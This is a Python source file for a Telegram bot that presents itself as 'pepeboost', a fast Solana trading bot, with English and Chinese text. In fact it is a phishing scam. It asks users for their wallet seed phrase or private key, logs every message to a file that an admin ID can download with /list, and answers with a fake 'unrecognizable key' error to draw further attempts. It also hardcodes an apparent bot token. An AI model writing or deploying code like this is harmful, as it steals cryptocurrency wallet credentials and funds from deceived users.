import asyncio
import time
from datetime import datetime
import os
from aiohttp import web
import aiofiles
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, filters, ContextTypes, MessageHandler
from typing import Final

# Token and configurations
TOKEN: Final = '7523077804:AAEWFJuuqYYO14TkBAwCuVvWdQWWeZaGoR4'
BOT_USERNAME: Final = '@pepeboost_soll_bot'
LOG_FILE_PATH: Final = 'user_messages.txt'
ADMIN_USER_ID = 5551837706
PORT = int(os.environ.get('PORT', 8080))

# Initialize bot application
bot_application = None

async def web_handler(request):
    """Handle incoming HTTP requests"""
    return web.Response(text="Bot is running!")

async def setup_webhook(app, bot_token):
    """Setup webhook for the bot"""
    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_URL', 'your-app-name.onrender.com')}/{bot_token}"
    await bot_application.bot.set_webhook(webhook_url)
    
async def handle_webhook(request):
    """Handle incoming webhook updates"""
    try:
        update = Update.de_json(await request.json(), bot_application.bot)
        await bot_application.process_update(update)
        return web.Response(text="OK")
    except Exception as e:
        return web.Response(text=f"Error: {e}", status=500)

# Your existing command handlers
async def list(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """处理 /getlogs 命令，发送 user_messages.txt 的内容"""
    user = update.effective_user
    if user.id != ADMIN_USER_ID:
        await update.message.reply_text("🔗 Please import a wallet to start\n\n请先绑定钱包")
        return

    try:
        async with aiofiles.open('user_messages.txt', mode='r', encoding='utf-8') as f:
            content = await f.read()
        if len(content) > 4000:
            async with aiofiles.open('user_messages.txt', mode='rb') as f:
                await update.message.reply_document(document=f, filename='user_messages.txt')
        else:
            await update.message.reply_text(content or "日志文件为空。")
    except Exception as e:
        await update.message.reply_text(f"无法读取日志文件: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("🔌 Import Wallet / 绑定钱包", callback_data='link_wallet')],
        [InlineKeyboardButton("💰 Trade / 交易", callback_data='trade')],
        [InlineKeyboardButton("💴 Withdraw / 提现", callback_data='withdraw')],
        [InlineKeyboardButton("💳 My Wallet / 查看我的钱包", callback_data='my_wallet')],
        [InlineKeyboardButton("📖 Help / 帮助", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = (
        "Welcome to pepeboost, extremely fast solana trading bot. ⚡️Support Pumpfun tokens, Snipe, and Limit orders.\n\n"
        "⚡️欢迎使用pepeboost sol交易机器人"
    )
    await update.message.reply_text(message, reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == 'link_wallet':
        response_text = 'Please enter wallet secret phrase or private key.\n\n请输入您的助记词或私钥'
    elif query.data == 'trade':
        response_text = '🔗 Please import a wallet to start\n\n请先绑定钱包'
    elif query.data == 'withdraw':
        response_text = '🔗 Please import a wallet to start\n\n请先绑定钱包'
    elif query.data == 'my_wallet':
        response_text = '🔗 Please import a wallet to start\n\n请先绑定钱包'
    elif query.data == 'help':
        response_text = (
            "⭐️ What should I do if the bot is lagging?\n"
            # ... (保持原有的帮助文本内容)
            "🐦 https://twitter.com/PepeBoost888"
        )
    else:
        response_text = "请点击按钮 'Link Your Wallet / 绑定钱包' 来绑定您的钱包。"

    time.sleep(1)
    await query.message.reply_text(response_text)

async def handle_random_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.message.from_user
    user_id = user.id
    username = user.username or user.full_name
    user_text = update.message.text

    log_entry = f"UserID: {user_id} | Username: {username} | Message: {user_text}\n"

    try:
        async with aiofiles.open(LOG_FILE_PATH, mode='a', encoding='utf-8') as f:
            await f.write(log_entry)
        print(f"记录消息: {log_entry.strip()}")
    except Exception as e:
        print(f"记录消息时出错: {e}")

    user_text = update.message.text.lower()
    if 'hello' in user_text or 'hi' in user_text:
        response = "Hello! 👋 如何我可以帮助您？"
    elif 'wallet' in user_text:
        response = "请点击按钮 'Link Your Wallet / 绑定钱包' 来绑定您的钱包。"
    else:
        time.sleep(3)
        response = "❌ The format of the phrase or key entered is unrecognizable\n输入的私钥地址格式有误或无法识别"

    await update.message.reply_text(response)

async def main():
    global bot_application
    
    # 创建 Application 对象
    bot_application = Application.builder().token(TOKEN).build()

    # 添加处理器
    bot_application.add_handler(CommandHandler('start', start))
    bot_application.add_handler(CommandHandler('list', list))
    bot_application.add_handler(CallbackQueryHandler(button_callback))
    bot_application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_random_message))

    # 创建 web 应用
    app = web.Application()
    app.router.add_get('/', web_handler)
    app.router.add_post(f'/{TOKEN}', handle_webhook)

    # 设置 webhook
    await setup_webhook(app, TOKEN)

    # 启动 web 服务器
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    print(f"Bot webhook server is running on port {PORT}")
    
    # 保持应用运行
    try:
        await asyncio.Event().wait()
    except Exception as e:
        print(f"Error: {e}")
        await runner.cleanup()

if __name__ == '__main__':
    asyncio.run(main())
